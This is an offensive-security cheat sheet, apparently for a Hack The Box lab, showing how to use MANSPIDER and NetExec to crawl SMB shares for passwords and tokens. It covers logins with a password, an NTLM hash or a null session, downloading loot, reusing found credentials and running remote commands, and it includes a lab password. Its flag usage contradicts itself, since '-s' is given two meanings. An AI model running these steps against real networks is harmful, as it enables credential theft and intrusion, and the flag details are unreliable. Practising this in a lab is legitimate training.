

---

# ## MANSPIDER — SMB Credential Hunting Cheat Sheet (Corrected)

> [!ABSTRACT] What it does  
> MANSPIDER is an SMB share crawler that:

- enumerates accessible shares
    
- recursively walks directories
    
- searches file contents for sensitive strings
    
- optionally filters by extensions and patterns (keyword-based, NOT regex pipe mode)
    

---

# > [!INFO] Core syntax

```bash
manspider <target> -u <user> -p <pass> [options]
```

Example:

```bash
manspider 10.129.12.214 -u mendres -p 'Inlanefreight2025!'
```

---

# > [!CHECK] Authentication options

## Password auth

```bash
manspider 10.129.12.214 -u user -p pass
```

## Hash auth

```bash
manspider 10.129.12.214 -u Administrator -H <NTLM_HASH>
```

## Domain auth

```bash
manspider 10.129.12.214 -u user -p pass -d DOMAIN
```

---

# > [!INFO] Share targeting

## Target specific share

```bash
manspider 10.129.12.214 -u user -p pass -s IT
```

## Multiple shares

```bash
manspider 10.129.12.214 -u user -p pass --sharenames IT Finance HR
```

---

# > [!SUCCESS] Recursion control

## Increase depth

```bash
manspider 10.129.12.214 -u user -p pass -m 10
```

## Limit file size (avoid junk)

```bash
manspider 10.129.12.214 -u user -p pass -s 1000000
```

---

# > [!INFO] File type filtering (VERY IMPORTANT)

## Focus high-value files

```bash
manspider 10.129.12.214 -u user -p pass -e txt ini config xml ps1 docx xlsx
```

## Exclude noisy types

```bash
manspider 10.129.12.214 -u user -p pass --exclude-extensions exe dll png jpg
```

---

# > [!SUCCESS] Content searching (CORRECT METHOD)

⚠️ This is NOT regex-style piping.

You provide **multiple keywords**, not a regex string.

---

## Credential hunting (basic)

```bash
manspider 10.129.12.214 -u user -p pass -f password secret token
```

---

## Strong HTB pattern set

```bash
manspider 10.129.12.214 -u user -p pass -f password passwd pwd secret token cred login admin
```

---

## Config + code leak hunting

```bash
manspider 10.129.12.214 -u user -p pass -f connection config db host user pass key
```

---

# > [!CHECK] Advanced filtering

## Only modified recently

```bash
manspider 10.129.12.214 -u user -p pass --modified-after 2024-01-01
```

## Limit recursion depth

```bash
manspider 10.129.12.214 -u user -p pass -m 5
```

---

# > [!SUCCESS] Output control

## Quiet mode

```bash
manspider 10.129.12.214 -u user -p pass -q
```

## Save loot locally

```bash
manspider 10.129.12.214 -u user -p pass -l loot/
```

## Download matched files

```bash
manspider 10.129.12.214 -u user -p pass -o
```

---

# > [!INFO] Null / guest access

```bash
manspider 10.129.12.214 -u '' -p ''
```

---

# > [!WARNING] Common mistakes

❌ Wrong (regex thinking)

```bash
--regex "password|secret"
```

❌ Wrong (NetExec-style assumption)

```bash
--pattern "password"
```

✔ Correct (MANSPIDER style)

```bash
-f password secret token
```

---

# > [!SUCCESS] Real HTB workflow

## Step 1 — enumerate SMB

```bash
nxc smb 10.129.12.214 -u user -p pass --shares
```

## Step 2 — spider for creds

```bash
manspider 10.129.12.214 -u user -p pass -f password secret token -e txt ini config ps1 docx xlsx
```

## Step 3 — reuse creds

```bash
nxc smb 10.129.12.214 -u newuser -p newpass
```

## Step 4 — execution pivot

```bash
nxc smb 10.129.12.214 -u user -p pass -x whoami
```

---

# > [!TLDR]

- MANSPIDER = SMB file crawler
    
- Filtering = keyword list (`-f a b c`)
    
- NOT regex pipe style
    
- Best used after SMB share enumeration
    

---

